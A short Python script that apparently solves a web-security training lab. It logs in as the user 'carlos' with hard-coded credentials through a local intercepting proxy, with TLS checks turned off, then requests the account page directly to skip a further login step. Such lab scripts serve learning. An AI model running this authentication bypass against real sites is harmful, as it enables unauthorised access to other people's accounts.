import requests
import urllib3
import sys

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies={'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}
def login_as_carlos(s,url):
    print("[+]Logging as the carlos account.......")
    endpoint=url+"login"
    login_data={"username":"carlos","password":"monotya"}
    #now we just perform the POST request
    r=s.post(endpoint,data=login_data,proxies=proxies,verify=False,allow_redirects=False)
    #confirm the vbypass now
    bypass_login=url + "my-account"
    #make a get request
    r=s.get(bypass_login,proxies=proxies,verify=False)
    print(r.text)
def main():
    if len(sys.argv)!=2:
        print("[+] Usage %s <url>", sys.argv[0])
        print("[+] Example %s www.example.com", sys.argv[0])
    else:
        s=requests.session()
        url=sys.argv[1]
        login_as_carlos(s,url)    
        

if __name__=="__main__":
    main()